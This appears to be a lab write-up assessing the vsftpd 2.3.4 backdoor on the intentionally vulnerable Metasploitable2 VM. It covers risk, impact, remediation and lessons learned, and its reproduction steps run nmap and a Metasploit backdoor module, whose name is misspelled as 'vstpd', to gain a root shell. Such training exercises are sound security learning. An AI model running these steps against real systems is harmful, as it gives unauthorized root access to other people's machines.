# Vulnerability Assessment

## Scenario
Analysis and execution of a vulnerability on the Metasploitable2 VM. Metasploitable2 is a deliberately vulnerable virtual machine running on Ubuntu linux.

## Vulnerability:
vsftpd 2.3.4 Smiley Face Backdoor

## Risk
- Attempting to login with a username containing ':)' (a smiley face) triggers the backdoor, which results in a shell listening on TCP port 6200.
- The shell stops listening after a client connects to and disconnects from it.


## Tools Used
- Kali Linux
- Linux terminal
- Nmap
- Metasploit
- Vmware
- MitreAttack
- STRIDE
- TryHackMe SOC lab

## Reproduction Steps
1. Sudo netdiscover
2. nmap -sV -O [IP Address for Metasploitable2]
3. Msfconsole
4. use exploit/unix/ftp/vstpd_234_backdoor
5. Set RHOST [IP Address for Metasploitable2]
6. exploit


## Impact
- An unauthenticated, remote attacker could exploit this to execute arbitrary code as root.
- The attacker would gain full control of the system and give them free reign to execute any attack they want

## Remediation
Validate and recompile a legitimate copy of the source code.

## What I Learned
- To investigate and discover potential vulnerabilities
- The importance of being able to anaylse a threat, from it's likelihood to the potential impact
- The importance of documenting and reporting my findings with evidence
